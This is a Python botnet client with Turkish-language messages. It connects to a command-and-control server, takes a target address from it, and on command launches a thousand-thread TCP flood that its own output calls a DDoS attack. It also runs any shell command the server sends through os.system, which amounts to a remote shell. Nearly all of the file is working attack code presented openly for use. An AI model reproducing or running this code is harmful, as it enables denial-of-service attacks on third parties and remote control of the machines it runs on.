import socket
import threading
import os
import time
import random
from colorama import init, Fore
from pyfiglet import Figlet

init()

colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.YELLOW, Fore.WHITE]

def print_logo():
    figlet = Figlet(font='block')
    logo = figlet.renderText(' CLIENT ')
    colored_logo = colorize_ascii_art(logo)
    print(colored_logo)

def colorize_ascii_art(ascii_art):
    colored_art = ""
    for line in ascii_art.splitlines():
        for char in line:
            colored_art += random.choice(colors) + char
        colored_art += Fore.RESET + "\n"
    return colored_art

C2_SERVER_IP = '127.0.0.1'
C2_SERVER_PORT = 12669
CONNECTION_TIMEOUT = 10

PACKET_SIZE = 4096

def execute_termux_command(command):
    try:
        os.system(command)
        print(Fore.GREEN + f"[+] Komut çalıştırıldı: {command}" + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"[!] Komut çalıştırılamadı: {e}" + Fore.RESET)

def send_packets(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            sock.connect((target_ip, target_port))
            while True:
                try:
                    sock.send(b'A' * PACKET_SIZE)
                    print(Fore.GREEN + "[+] Paket gönderildi" + Fore.RESET)
                except socket.error:
                    break
            sock.close()
        except (socket.timeout, socket.error):
            time.sleep(5)

def connect_to_c2():
    global target_ip, target_port
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            sock.connect((C2_SERVER_IP, C2_SERVER_PORT))

            while True:
                try:
                    choice = sock.recv(1024).decode()
                    if not choice:
                        break

                    if choice == '1':
                        target_info = sock.recv(1024).decode().split(':')
                        if len(target_info) == 2:
                            target_ip, target_port = target_info[0], int(target_info[1])
                            print(Fore.GREEN + f"Hedef IP ve port belirlendi: {target_ip}:{target_port}" + Fore.RESET)
                    elif choice == '2':
                        action = sock.recv(1024).decode()
                        if action == 'start':
                            print(Fore.GREEN + "DDoS saldırısı başlatıldı." + Fore.RESET)
                            for _ in range(1000):
                                thread = threading.Thread(target=send_packets, args=(target_ip, target_port))
                                thread.start()
                        elif action == 'stop':
                            print(Fore.GREEN + "DDoS saldırısı durduruldu." + Fore.RESET)
                    elif choice.startswith('termux'):
                        command = choice[7:]
                        execute_termux_command(command)
                except (socket.timeout, socket.error):
                    pass
        except (socket.timeout, socket.error):
            print(Fore.RED + f"Connection error: {e}" + Fore.RESET)
            time.sleep(5)

if __name__ == '__main__':
    print_logo()
    connect_to_c2()